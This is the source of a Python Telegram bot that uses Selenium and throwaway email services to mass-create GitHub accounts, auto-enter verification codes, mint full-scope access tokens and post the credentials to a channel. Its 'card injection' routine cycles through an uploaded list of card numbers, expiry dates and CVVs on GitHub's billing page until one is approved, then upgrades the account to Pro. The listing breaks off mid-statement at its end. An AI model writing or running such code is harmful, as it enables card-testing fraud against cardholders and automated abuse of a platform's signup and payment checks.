import telebot
import threading
import time, random, string
import requests
import re
import os
import hashlib
import json
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from TempMail import TempMail
#from temp_mail import TempMail
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHROMEDRIVER_PATH = "/usr/local/bin/chromedriver"
PASSWORD = "YourDefaultPassword@123"
bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}
user_accounts = {} 
ADMIN_IDS = [YOUR_TELEGRAM_USER_ID]
APPROVE_FILE = "approve.txt"
ACCOUNTS_FILE = "accounts.json"
CHANNEL_ID = YOUR_CHANNEL_ID  # Channel where accounts are posted
approved_users = set()

# Load approved users
if os.path.exists(APPROVE_FILE):
    with open(APPROVE_FILE, "r") as f:
        approved_users = set(int(line.strip()) for line in f if line.strip().isdigit())

# Load saved accounts
if os.path.exists(ACCOUNTS_FILE):
    try:
        with open(ACCOUNTS_FILE, "r") as f:
            user_accounts = json.load(f)
    except:
        user_accounts = {}

def save_approved_user(user_id):
    approved_users.add(user_id)
    with open(APPROVE_FILE, "a") as f:
        f.write(f"{user_id}\n")

def save_account(user_id, account_data):
    """Save account data to persistent storage"""
    if str(user_id) not in user_accounts:
        user_accounts[str(user_id)] = []
    user_accounts[str(user_id)].append(account_data)

    with open(ACCOUNTS_FILE, "w") as f:
        json.dump(user_accounts, f, indent=2)

def get_user_accounts(user_id):
    """Get all accounts for a user"""
    return user_accounts.get(str(user_id), [])

def random_suffix(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

class TempMailService:
    def __init__(self):
        self.tmp = TempMail()
        self.inbox = None
        self.email = None

    def create_email(self):
        try:
            print("Creating temporary email using TempMail library...")
            self.inbox = self.tmp.createInbox()
            self.email = self.inbox.address
            print(f"Created email: {self.email}")
            return self.email
        except Exception as e:
            print(f"Error creating email: {e}")
            return None

    def get_otp_from_github_email(self, max_attempts=30):
        """Extract 8-digit OTP from GitHub verification email"""
        print(f"Looking for OTP in emails for {max_attempts} attempts...")
        for attempt in range(max_attempts):
            print(f"Attempt {attempt + 1}/{max_attempts}")
            try:
                emails = self.tmp.getEmails(self.inbox)
                print(f"Found {len(emails)} emails")

                for email in emails:
                    sender = email.sender.lower() if hasattr(email, 'sender') else ''
                    subject = email.subject if hasattr(email, 'subject') else ''
                    body = email.body if hasattr(email, 'body') else ''

                    print(f"Email from: {sender}")
                    print(f"Subject: {subject}")

                    if 'github' in sender or 'noreply' in sender or 'github' in subject.lower():
                        print(f"GitHub email found - Subject: {subject}")

                        # Look for 8-digit OTP pattern
                        otp_match = re.search(r'\b\d{8}\b', body)
                        if otp_match:
                            otp = otp_match.group()
                            print(f"Found 8-digit OTP: {otp}")
                            return otp

                        # Look for 6-digit OTP as fallback
                        otp_match = re.search(r'\b\d{6}\b', body)
                        if otp_match:
                            otp = otp_match.group()
                            print(f"Found 6-digit OTP: {otp}")
                            return otp

                        # Alternative patterns
                        otp_match = re.search(r'verification code[:\s]*(\d{6,8})', body, re.IGNORECASE)
                        if otp_match:
                            otp = otp_match.group(1)
                            print(f"Found OTP (alternative pattern): {otp}")
                            return otp

                        print(f"GitHub email body preview: {body[:200]}...")

            except Exception as e:
                print(f"Error checking emails: {e}")

            time.sleep(3)

        print("No OTP found after all attempts")
        return None

class OneSecMailService:
    def __init__(self):
        self.base_url = "https://www.1secmail.com/api/v1/"
        self.email = None
        self.login = None
        self.domain = None

    def get_domains(self):
        try:
            response = requests.get(f"{self.base_url}?action=getDomainList", timeout=10)
            return response.json()
        except:
            return ['1secmail.com', '1secmail.org', '1secmail.net']

    def create_email(self):
        try:
            print("Creating email using 1SecMail...")
            domains = self.get_domains()
            self.login = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            self.domain = random.choice(domains)
            self.email = f"{self.login}@{self.domain}"
            print(f"Created 1SecMail email: {self.email}")
            return self.email
        except Exception as e:
            print(f"Error creating 1SecMail: {e}")
            return None

    def get_otp_from_github_email(self, max_attempts=30):
        print(f"Looking for OTP in 1SecMail for {max_attempts} attempts...")
        for attempt in range(max_attempts):
            try:
                response = requests.get(
                    f"{self.base_url}?action=getMessages&login={self.login}&domain={self.domain}",
                    timeout=10
                )
                messages = response.json()

                for msg in messages:
                    if 'github' in msg.get('from', '').lower() or 'github' in msg.get('subject', '').lower():
                        # Get full message
                        msg_response = requests.get(
                            f"{self.base_url}?action=readMessage&login={self.login}&domain={self.domain}&id={msg['id']}",
                            timeout=10
                        )
                        full_msg = msg_response.json()
                        body = full_msg.get('body', '')

                        # Look for OTP
                        otp_match = re.search(r'\b\d{6,8}\b', body)
                        if otp_match:
                            return otp_match.group()
            except Exception as e:
                print(f"Error checking 1SecMail: {e}")

            time.sleep(3)
        return None

class TempMailPlusService:
    def __init__(self):
        self.base_url = "https://api.temp-mail.org/request"
        self.email = None
        self.hash = None

    def get_domains(self):
        try:
            response = requests.get(f"{self.base_url}/domains/format/json", timeout=10)
            return response.json()
        except:
            return ['@tempmail.org', '@temp-mail.org']

    def create_email(self):
        try:
            print("Creating email using TempMail.org...")
            domains = self.get_domains()
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            self.email = f"{name}{domains[0]}"
            self.hash = hashlib.md5(self.email.encode()).hexdigest()
            print(f"Created TempMail.org email: {self.email}")
            return self.email
        except Exception as e:
            print(f"Error creating TempMail.org: {e}")
            return None

    def get_otp_from_github_email(self, max_attempts=30):
        print(f"Looking for OTP in TempMail.org for {max_attempts} attempts...")
        for attempt in range(max_attempts):
            try:
                response = requests.get(
                    f"{self.base_url}/mail/id/{self.hash}/format/json",
                    timeout=10
                )
                messages = response.json()

                for msg in messages:
                    if 'github' in msg.get('mail_from', '').lower() or 'github' in msg.get('mail_subject', '').lower():
                        body = msg.get('mail_text', '')
                        otp_match = re.search(r'\b\d{6,8}\b', body)
                        if otp_match:
                            return otp_match.group()
            except Exception as e:
                print(f"Error checking TempMail.org: {e}")

            time.sleep(3)
        return None

class BackupTempMail:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.email = None

    def create_email(self):
        try:
            domains = ['@tempmail.org', '@10minutemail.net', '@mailinator.com']
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            self.email = f"{username}{random.choice(domains)}"
            print(f"Generated backup email: {self.email}")
            return self.email
        except Exception as e:
            print(f"Error creating backup email: {e}")
            return None

    def get_otp_from_github_email(self, max_attempts=30):
        return None

def create_temp_email_with_fallback():
    """Try multiple TempMail services in order"""
    services = [
        ("TempMail Library", TempMailService),
        ("1SecMail", OneSecMailService),
        ("TempMail.org", TempMailPlusService),
        ("Backup", BackupTempMail)
    ]

    for service_name, service_class in services:
        try:
            print(f"Trying {service_name}...")
            temp_mail = service_class()
            email = temp_mail.create_email()

            if email:
                print(f"Successfully created email with {service_name}: {email}")
                return temp_mail
            else:
                print(f"{service_name} failed to create email")
        except Exception as e:
            print(f"{service_name} error: {e}")
            continue

    return None

@bot.message_handler(commands=['approve'])
def approve_user(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS:
        return bot.send_message(chat_id, "❌ You are not authorized to approve users.")

    args = msg.text.strip().split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(chat_id, "Usage: /approve <user_id>")

    user_id = int(args[1])
    save_approved_user(user_id)
    bot.send_message(chat_id, f"✅ Approved user with ID: {user_id}")
    bot.send_message(CHANNEL_ID, f"✅ Approved user: `{user_id}`", parse_mode="Markdown")

@bot.message_handler(commands=['upload_cards'])
def upload_cards_command(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS and chat_id not in approved_users:
        return bot.send_message(chat_id, "❌ You are not allowed to use this command.")

    bot.send_message(chat_id, "📤 Please upload your card.txt file.\n\nFormat: `number|month|year|cvv` (one per line)\nExample:\n`4111111111111111|12|25|123`", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_document(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS and chat_id not in approved_users:
        return bot.send_message(chat_id, "❌ You are not allowed to upload files.")

    if msg.document.file_name == "card.txt":
        try:
            file_info = bot.get_file(msg.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open("card.txt", "wb") as f:
                f.write(downloaded_file)

            # Validate card format
            with open("card.txt", "r") as f:
                lines = f.readlines()
                valid_cards = 0
                for line in lines:
                    if line.strip() and "|" in line:
                        parts = line.strip().split("|")
                        if len(parts) == 4:
                            valid_cards += 1

            bot.send_message(chat_id, f"✅ Card file uploaded successfully!\n📊 Found {valid_cards} valid cards.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error uploading file: {e}")
    else:
        bot.send_message(chat_id, "❌ Please upload a file named 'card.txt'")

@bot.message_handler(commands=['github'])
def handle_github_cmd(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS and chat_id not in approved_users:
        return bot.send_message(chat_id, "❌ You are not allowed to use this command.")

    args = msg.text.strip().split()
    if len(args) != 2 or not args[1].isdigit():
        return bot.send_message(chat_id, "Usage: `/github <amount>`\nExample: `/github 5` (to create 5 accounts)", parse_mode="Markdown")

    amount = int(args[1])
    if amount < 1 or amount > 500:
        return bot.send_message(chat_id, "❌ Amount must be between 1 and 500 accounts.")

    bot.send_message(chat_id, f"🚀 Starting creation of {amount} GitHub accounts...\nAccounts will be created one by one.")
    threading.Thread(target=create_multiple_accounts, args=(chat_id, amount)).start()

@bot.message_handler(commands=['accounts'])
def show_accounts(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS and chat_id not in approved_users:
        return bot.send_message(chat_id, "❌ You are not allowed to use this command.")

    accounts = get_user_accounts(chat_id)
    if not accounts:
        return bot.send_message(chat_id, "📭 You don't have any GitHub accounts yet.\nUse `/github <amount>` to create accounts.", parse_mode="Markdown")

    markup = InlineKeyboardMarkup()
    for i, account in enumerate(accounts):
        markup.row(InlineKeyboardButton(f"Account {i+1}: {account['username']}", callback_data=f"account_{chat_id}_{i}"))

    bot.send_message(chat_id, f"📋 Your GitHub Accounts ({len(accounts)} total):\nClick on any account to view details:", reply_markup=markup)

def create_multiple_accounts(chat_id, amount):
    """Create multiple GitHub accounts one by one"""
    success_count = 0
    failed_count = 0

    for i in range(amount):
        bot.send_message(chat_id, f"🔄 Creating account {i+1}/{amount}...")

        result = github_signup_auto(chat_id, account_number=i+1)

        if result:
            success_count += 1
            bot.send_message(chat_id, f"✅ Account {i+1}/{amount} created successfully!")
        else:
            failed_count += 1
            bot.send_message(chat_id, f"❌ Account {i+1}/{amount} failed to create.")

        # Wait between accounts to avoid rate limiting
        if i < amount - 1:
            bot.send_message(chat_id, "⏳ Waiting 10 seconds before creating next account...")
            time.sleep(10)

    # Final summary
    summary = f"🎯 **Account Creation Summary**\n\n"
    summary += f"✅ Successful: {success_count}\n"
    summary += f"❌ Failed: {failed_count}\n"
    summary += f"📊 Total: {amount}\n\n"
    summary += f"Use `/accounts` to view all your accounts."

    bot.send_message(chat_id, summary, parse_mode="Markdown")

def create_repo_and_codespace(driver, wait, username):
    try:
        driver.get("https://github.com/new")
        suggested_btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[contains(@aria-label, 'Use suggested repository name')]")))
        repo_name = suggested_btn.text.strip()
        suggested_btn.click()
        readme_toggle = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@aria-labelledby='add-readme']")))
        if readme_toggle.get_attribute("aria-pressed") == "false":
            readme_toggle.click()
        time.sleep(1)
        create_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@type='submit' and .//span[text()='Create repository']]")))
        create_button.click()
        time.sleep(5)
        code_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//summary[contains(@class, 'get-repo-select-menu')]")))
        code_button.click()
        time.sleep(1)
        codespaces_tab = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Codespaces')]")))
        codespaces_tab.click()
        time.sleep(1)
        create_codespace_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Create codespace on main')]")))
        create_codespace_btn.click()
        return repo_name
    except Exception as e:
        print("❌ Error in repo/codespace creation:", e)
        return None

def upgrade_to_github_pro(driver, chat_id=None):
    wait = WebDriverWait(driver, 20)
    try:
        time.sleep(10)
        driver.get("https://github.com/settings/billing/licensing")

        if chat_id:
            bot.send_message(chat_id, "🔁 Opening Licensing Page...")

        try:
            upgrade_link = wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Upgrade to GitHub Pro')]")))
            upgrade_link.click()
            if chat_id:
                bot.send_message(chat_id, "✅ Clicked 'Upgrade to GitHub Pro' link.")
        except Exception as link_error:
            if chat_id:
                bot.send_message(chat_id, f"⚠️ Could not find upgrade link: {link_error}")
            return False

        try:
            final_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[.//span[contains(text(), 'Upgrade to GitHub Pro')]]")))
            time.sleep(2)
            final_button.click()
            if chat_id:
                bot.send_message(chat_id, "✅ Clicked final 'Upgrade to GitHub Pro' button.")
        except Exception as button_error:
            if chat_id:
                bot.send_message(chat_id, f"⚠️ Failed - Card not added or insufficient balance")
            return False

        time.sleep(5)
        if "GitHub Pro" in driver.page_source:
            return True
        return True
    except Exception as e:
        if chat_id:
            bot.send_message(chat_id, f"❌ Error during upgrade: {e}")
        return False

def github_signup_auto(chat_id, account_number=1):
    USERNAME = "jnjks" + ''.join(random.choices(string.ascii_lowercase, k=6))
    IOS_USER_AGENTS = [
        "Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    ]

    # Create temporary email using TempMail library
    temp_mail = create_temp_email_with_fallback()

    if not temp_mail or not temp_mail.email:
        bot.send_message(chat_id, f"❌ Account {account_number}: Failed to create temporary email")
        return False

    email = temp_mail.email

    # Check if it's from TempMail library
    if isinstance(temp_mail, TempMailService):
        bot.send_message(chat_id, f"📧 Account {account_number}: Created temporary email: `{email}`", parse_mode="Markdown")
    else:
        bot.send_message(chat_id, f"⚠️ Account {account_number}: Using backup email: `{email}`", parse_mode="Markdown")

    try:
        ios_user_agent = random.choice(IOS_USER_AGENTS)
        service = Service(CHROMEDRIVER_PATH)
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--log-level=3')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--incognito')
        options.add_argument(f"user-agent={ios_user_agent}")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])

        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 30)

        driver.get("https://github.com/signup")
        bot.send_message(chat_id, f"🟢 Account {account_number}: Start Creating GitHub Account...")

        # Enter email
        email_input = wait.until(EC.presence_of_element_located((By.ID, "email")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)

        # Enter password
        password_input = wait.until(EC.presence_of_element_located((By.ID, "password")))
        password_input.send_keys(PASSWORD)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)

        # Enter username
        username_input = wait.until(EC.presence_of_element_located((By.ID, "login")))
        username_input.send_keys(USERNAME)
        username_input.send_keys(Keys.RETURN)
        time.sleep(2)

        # Click create account button
        create_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.signup-form-fields__button")))
        driver.execute_script("arguments[0].click();", create_button)

        old_url = driver.current_url
        for _ in range(30):
            if driver.current_url != old_url:
                break
            time.sleep(1)

        if "account_verifications" in driver.current_url:
            bot.send_message(chat_id, f"📨 Account {account_number}: Waiting for OTP from email...")

            # Only try to get OTP if using TempMail library
            if isinstance(temp_mail, TempMailService) or isinstance(temp_mail, OneSecMailService) or isinstance(temp_mail, TempMailPlusService):
                otp = temp_mail.get_otp_from_github_email()

                if not otp:
                    bot.send_message(chat_id, f"❌ Account {account_number}: Failed to receive OTP from email")
                    driver.quit()
                    return False

                bot.send_message(chat_id, f"✅ Account {account_number}: Received OTP: `{otp}`", parse_mode="Markdown")

                # Enter OTP (handle both 6 and 8 digit OTPs)
                otp_length = len(otp)
                for i, digit in enumerate(otp):
                    if i < 8:  # GitHub OTP fields are typically 8 digits max
                        otp_field = wait.until(EC.element_to_be_clickable((By.ID, f"launch-code-{i}")))
                        otp_field.clear()
                        otp_field.send_keys(digit)
                        time.sleep(0.1)

                # Click continue button
                for btn in driver.find_elements(By.TAG_NAME, "button"):
                    if "Continue" in btn.text:
                        driver.execute_script("arguments[0].click();", btn)
                        break
            else:
                bot.send_message(chat_id, f"⚠️ Account {account_number}: Using backup email - OTP verification not available.")
                driver.quit()
                return False

            time.sleep(5)

            # Login to verify account creation
            driver.get("https://github.com/login")
            wait.until(EC.presence_of_element_located((By.ID, "login_field"))).send_keys(USERNAME)
            driver.find_element(By.ID, "password").send_keys(PASSWORD)
            driver.find_element(By.NAME, "commit").click()
            time.sleep(3)

            if "sessions/verified-device" in driver.current_url:
                bot.send_message(chat_id, f"🛡 Account {account_number}: Device verification required. Handling automatically...")
                time.sleep(5)

            # Create repository and codespace
            create_repo_and_codespace(driver, wait, USERNAME)

            # Create GitHub token
            driver.get("https://github.com/settings/tokens/new")
            wait.until(EC.presence_of_element_located((By.ID, "oauth_access_description")))
            token_name = "SoulKing" + random_suffix()

            desc = driver.find_element(By.ID, "oauth_access_description")
            desc.clear()
            desc.send_keys(token_name)

            scopes = ["repo", "user", "codespace", "admin:org", "delete_repo", "workflow", "write:packages",
                      "delete:packages", "admin:public_key", "admin:repo_hook", "admin:org_hook", "gist",
                      "notifications", "admin:enterprise", "audit_log", "copilot", "write:network_configurations",
                      "project", "admin:gpg_key", "admin:ssh_signing_key"]

            for scope in scopes:
                try:
                    checkbox = wait.until(EC.element_to_be_clickable((By.XPATH, f"//input[@type='checkbox' and @value='{scope}']")))
                    if not checkbox.is_selected():
                        driver.execute_script("arguments[0].click();", checkbox)
                except:
                    pass

            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Generate token')]")
            driver.execute_script("arguments[0].click();", submit_btn)

            wait.until(EC.presence_of_element_located((By.ID, "new-oauth-token")))
            token = driver.find_element(By.ID, "new-oauth-token").text.strip()

            # Save account data
            account_data = {
                "username": USERNAME,
                "password": PASSWORD,
                "token": token,
                "email": email,
                "created_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                "account_number": account_number
            }

            save_account(chat_id, account_data)

            # Store in session for immediate access
            user_sessions[f"{chat_id}_{account_number}"] = account_data

            # Send to channel
            tg_user = bot.get_chat(chat_id)
            gh_info = f"👤 GitHub Username: `{USERNAME}`\n🔐 Password: `{PASSWORD}`\n🪪 Token: `{token}`\n📧 Email: `{email}`"
            tg_info = f"👤 TG User: {tg_user.first_name} (@{tg_user.username})\n🆔 ID: `{chat_id}`\n📊 Account #{account_number}"
            bot.send_message(CHANNEL_ID, f"{tg_info}\n\n{gh_info}", parse_mode="Markdown")

            # Handle billing and card injection
            try:
                billing_url = "https://github.com/settings/billing/payment_information"
                driver.get(billing_url)
                bot.send_message(chat_id, f"💳 Account {account_number}: Opening Billing Information Page...")

                wait.until(EC.presence_of_element_located((By.ID, "account_screening_profile_first_name"))).send_keys("soul")
                driver.find_element(By.ID, "account_screening_profile_last_name").send_keys("king")
                driver.find_element(By.ID, "account_screening_profile_address1").send_keys("delhi")
                driver.find_element(By.ID, "account_screening_profile_city").send_keys("delhi")
                Select(driver.find_element(By.ID, "account_screening_profile_country_code")).select_by_value("IN")
                driver.find_element(By.ID, "account_screening_profile_postal_code").send_keys("100012")


                wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@name='submit' and contains(., 'Save billing information')]"))).click()
                bot.send_message(chat_id, f"💾 Account {account_number}: Saved Billing Information.")
                time.sleep(3)

                driver.refresh()
                time.sleep(5)

                try:
                    warning_banner = driver.find_element(By.CSS_SELECTOR, '[data-testid="trade-screening-status-banner"]')
                    if "flagged" in warning_banner.text.lower():
                        bot.send_message(chat_id, f"🚫 Account {account_number}: Account is FLAGGED. Cannot proceed with billing.")
                        driver.quit()
                        return True  # Still consider it successful since account was created

                except:
                    bot.send_message(chat_id, f"✅ Account {account_number}: No flagged warning detected.")

                # Card injection logic
                if os.path.exists("card.txt"):
                    with open("card.txt", "r") as f:
                        card_list = [line.strip() for line in f if line.strip()]

                    for card_line in card_list:
                        driver.get(billing_url)
                        bot.send_message(chat_id, f"💳 Account {account_number}: Trying card: `{card_line[:4]}****`", parse_mode="Markdown")
                        try:
                            add_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.js-edit-payment-method-btn")))
                            add_btn.click()
                            wait.until(EC.frame_to_be_available_and_switch_to_it((By.ID, "z_hppm_iframe")))

                            card_number, month, year, cvv = card_line.split("|")
                            wait.until(EC.presence_of_element_located((By.ID, "input-creditCardNumber"))).send_keys(card_number)
                            Select(wait.until(EC.element_to_be_clickable((By.ID, "input-creditCardExpirationMonth")))).select_by_value(month)
                            full_year = f"20{year}" if len(year) == 2 else year
                            Select(wait.until(EC.element_to_be_clickable((By.ID, "input-creditCardExpirationYear")))).select_by_value(full_year)
                            wait.until(EC.presence_of_element_located((By.ID, "input-cardSecurityCode"))).send_keys(cvv)

                            wait.until(EC.element_to_be_clickable((By.ID, "submitButton"))).click()
                            bot.send_message(chat_id, f"💾 Account {account_number}: Submitted card. Waiting for confirmation...")
                            time.sleep(5)

                            try:
                                error_div = driver.find_element(By.ID, "error")
                                if "declined" in error_div.text.lower():
                                    bot.send_message(chat_id, f"❌ Account {account_number}: Card Declined")
                                    driver.switch_to.default_content()
                                    continue
                            except:
                                bot.send_message(chat_id, f"✅ Account {account_number}: Card approved.")
                                driver.switch_to.default_content()
                                upgrade_result = upgrade_to_github_pro(driver, chat_id)
                                if upgrade_result:
                                    bot.send_message(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
                                else:
                                    bot.send_message(chat_id, f"⚠️ Account {account_number}: Card submitted, but upgrade to GitHub Pro failed.")
                                break

                            driver.switch_to.default_content()
                            driver.refresh()
                            time.sleep(5)
                        except Exception as card_error:
                            bot.send_message(chat_id, f"⚠️ Account {account_number}: Card error")
                            driver.switch_to.default_content()
                            continue
                else:
                    bot.send_message(chat_id, f"⚠️ Account {account_number}: No card.txt file found. Skipping card injection.")

            except Exception as e:
                bot.send_message(chat_id, f"❌ Account {account_number}: Billing/Card error: {e}")

            # Try to upgrade to GitHub Pro even without card
            try:
                upgrade_result = upgrade_to_github_pro(driver, chat_id)
                if upgrade_result:
                    bot.send_message(chat_id, f"🎉 Account {account_number}: GitHub Pro Upgrade Successful!")
            except:
                pass

            driver.quit()
            return True

        else:
            bot.send_message(chat_id, f"❌ Account {account_number}: Account creation failed - no verification page found")
            driver.quit()
            return False

    except Exception as e:
        bot.send_message(chat_id, f"❌ Account {account_number}: Error during GitHub signup: {str(e)}")
        try:
            driver.quit()
        except:
            pass
        return False

@bot.message_handler(commands=['start'])
def start_command(msg):
    chat_id = msg.chat.id
    welcome_text = """
🤖 **GitHub Account Creator Bot**

**Commands:**
• `/github <amount>` - Create GitHub accounts (1-10)
• `/accounts` - View your created accounts
• `/upload_cards` - Upload card.txt file
• `/approve <user_id>` - Approve user (Admin only)
• `/test_email` - Test TempMail service (Admin only)

**Features:**
✅ Multiple temporary email services
✅ Auto OTP detection and verification
✅ GitHub token generation with full permissions
✅ Billing information setup
✅ Credit card injection (if card.txt exists)
✅ GitHub Pro upgrade attempt
✅ Persistent account storage
✅ One-by-one account creation

**Examples:**
• `/github 1` - Create 1 account
• `/github 5` - Create 5 accounts

**Note:** You need approval to use this bot.
Contact admin for access.
    """
    bot.send_message(chat_id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['test_email'])
def test_email_creation(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS:
        return bot.send_message(chat_id, "❌ Admin only command.")

    bot.send_message(chat_id, "🧪 Testing TempMail services...")
    temp_mail = create_temp_email_with_fallback()

    if temp_mail and temp_mail.email:
        service_name = temp_mail.__class__.__name__
        bot.send_message(chat_id, f"✅ {service_name} working: `{temp_mail.email}`", parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "❌ All TempMail services failed")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id

    if call.data.startswith("account_"):
        # Parse callback data: account_chatid_index
        parts = call.data.split("_")
        if len(parts) >= 3:
            original_chat_id = int(parts[1])
            account_index = int(parts[2])

            # Get accounts from persistent storage
            accounts = get_user_accounts(original_chat_id)

            if account_index < len(accounts):
                account = accounts[account_index]

                # Create inline keyboard for account details
                markup = InlineKeyboardMarkup()
                markup.row(
                    InlineKeyboardButton("👤 Username", callback_data=f"show_username_{original_chat_id}_{account_index}"),
                    InlineKeyboardButton("🔑 Password", callback_data=f"show_password_{original_chat_id}_{account_index}")
                )
                markup.row(
                    InlineKeyboardButton("🧾 Token", callback_data=f"show_token_{original_chat_id}_{account_index}"),
                    InlineKeyboardButton("📧 Email", callback_data=f"show_email_{original_chat_id}_{account_index}")
                )
                markup.row(InlineKeyboardButton("🔙 Back to Accounts", callback_data="back_to_accounts"))

                account_info = f"📋 **Account #{account_index + 1} Details**\n\n"
                account_info += f"👤 Username: `{account['username']}`\n"
                account_info += f"📅 Created: {account.get('created_at', 'Unknown')}\n\n"
                account_info += "Click buttons below to view sensitive information:"

                bot.edit_message_text(
                    account_info,
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    reply_markup=markup,
                    parse_mode="Markdown"
                )
            else:
                bot.answer_callback_query(call.id, "❌ Account not found.")

    elif call.data.startswith("show_"):
        # Parse callback data: show_field_chatid_index
        parts = call.data.split("_")
        if len(parts) >= 4:
            field = parts[1]
            original_chat_id = int(parts[2])
            account_index = int(parts[3])

            accounts = get_user_accounts(original_chat_id)

            if account_index < len(accounts):
                account = accounts[account_index]

                if field == "username":
                    bot.send_message(chat_id, f"👤 Username: `{account['username']}`", parse_mode="Markdown")
                elif field == "password":
                    bot.send_message(chat_id, f"🔑 Password: `{account['password']}`", parse_mode="Markdown")
                elif field == "token":
                    bot.send_message(chat_id, f"🧾 Token: `{account['token']}`", parse_mode="Markdown")
                elif field == "email":
                    bot.send_message(chat_id, f"📧 Email: `{account['email']}`", parse_mode="Markdown")

                bot.answer_callback_query(call.id, f"✅ {field.title()} sent!")
            else:
                bot.answer_callback_query(call.id, "❌ Account not found.")

    elif call.data == "back_to_accounts":
        # Show accounts list again
        accounts = get_user_accounts(chat_id)
        if accounts:
            markup = InlineKeyboardMarkup()
            for i, account in enumerate(accounts):
                markup.row(InlineKeyboardButton(f"Account {i+1}: {account['username']}", callback_data=f"account_{chat_id}_{i}"))

            bot.edit_message_text(
                f"📋 Your GitHub Accounts ({len(accounts)} total):\nClick on any account to view details:",
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=markup
            )
        else:
            bot.edit_message_text(
                "📭 You don't have any GitHub accounts yet.\nUse `/github <amount>` to create accounts.",
                chat_id=chat_id,
                message_id=call.message.message_id,
                parse_mode="Markdown"
            )

    else:
        bot.answer_callback_query(call.id, "Invalid selection.")

@bot.message_handler(commands=['stats'])
def show_stats(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS:
        return bot.send_message(chat_id, "❌ Admin only command.")

    total_users = len(user_accounts)
    total_accounts = sum(len(accounts) for accounts in user_accounts.values())

    stats_text = f"📊 **Bot Statistics**\n\n"
    stats_text += f"👥 Total Users: {total_users}\n"
    stats_text += f"🔢 Total Accounts Created: {total_accounts}\n"
    stats_text += f"✅ Approved Users: {len(approved_users)}\n\n"

    if user_accounts:
        stats_text += "**Top Users:**\n"
        sorted_users = sorted(user_accounts.items(), key=lambda x: len(x[1]), reverse=True)[:5]
        for user_id, accounts in sorted_users:
            try:
                user = bot.get_chat(int(user_id))
                name = user.first_name or "Unknown"
                stats_text += f"• {name} (`{user_id}`): {len(accounts)} accounts\n"
            except:
                stats_text += f"• User `{user_id}`: {len(accounts)} accounts\n"

    bot.send_message(chat_id, stats_text, parse_mode="Markdown")

@bot.message_handler(commands=['clear_accounts'])
def clear_accounts(msg):
    chat_id = msg.chat.id
    if chat_id not in ADMIN_IDS and chat_id not in approved_users:
        return bot.send_message(chat_id, "❌ You are not allowed to use this command.")

    if str(chat_id) in user_accounts:
        count = len(user_accounts[str(chat_id)])
        del user_accounts[str(chat_id)]

        # Save updated accounts
        with open(ACCOUNTS_FILE, "w") as f:
            json.dump(user_accounts, f, indent=2)

        bot.send_message(chat_id, f"🗑️ Cleared {count} accounts from your list.")
    else:
        bot.send_message(chat_id, "📭 You don't have any accounts to clear.")

@bot.message_handler(func=lambda m: True)
def handle_other_messages(msg):
    chat_id = msg.chat.id
    bot.send_message(chat_id, "ℹ️ Use `/start` for help or `/github <amount>` to create accounts.", parse_mode="Markdown")

# Main bot loop
if __name__ == "__main__":
    print("🤖 GitHub Account Creator Bot Started...")
    print(f"📊 Loaded {len(approved_users)} approved users")
    print(f"💾 Loaded {sum(len(accounts) for accounts in user_accounts.values())} total accounts")

    # Test TempMail service on startup
    print("🧪 Testing TempMail services...")
    temp_mail = create_temp_email_with_fallback()
    if temp_mail and temp_mail.email:
        service_name = temp_mail.__class__.__name__
        print(f"✅ {service_name} working: {temp_mail.email}")
    else:
